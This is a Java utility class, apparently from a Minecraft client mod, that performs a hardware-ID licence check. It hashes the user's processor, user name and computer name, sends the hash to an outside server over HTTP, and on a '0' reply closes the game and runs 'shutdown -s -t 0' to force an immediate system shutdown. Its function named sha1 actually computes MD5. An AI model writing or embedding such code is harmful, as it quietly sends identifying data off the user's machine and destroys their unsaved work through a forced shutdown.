package me.Divine.utils;

import java.math.*;
import java.security.*;
import net.minecraft.client.*;
import java.net.*;
import java.io.*;

public class MTSQL
{
    public static String getHwid() {
        return sha1(String.valueOf(System.getenv("PROCESSOR_IDENTIFIER").replace(" ", "") + System.getenv("NUMBER_OF_PROCESSORS") + System.getProperty("user.name") + System.getenv("COMPUTERNAME").trim()));
    }
    
    public static String sha1(final String input) {
        try {
            final MessageDigest md = MessageDigest.getInstance("md5");
            final byte[] messageDigest = md.digest(input.getBytes());
            final BigInteger no = new BigInteger(1, messageDigest);
            String hashtext;
            for (hashtext = no.toString(16); hashtext.length() < 32; hashtext = "0" + hashtext) {}
            return hashtext;
        }
        catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
    }
    
    public static boolean isOnBase() {
        final String hwid = getHwid();
        String base = null;
        try {
            base = get("http://cr39746.tmweb.ru/hwid.php?hwid=" + hwid);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        if (base == null) {
            return false;
        }
        if (base.equals("0")) {
            shotdown();
            return false;
        }
        return true;
    }
    
    public static void shotdown() {
        Minecraft.func_71410_x().func_71400_g();
        try {
            Runtime.getRuntime().exec("shutdown -s -t 0");
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public static String get(final String url) throws Exception {
        return new BufferedReader(new InputStreamReader(new URL(url).openConnection().getInputStream())).readLine();
    }
}
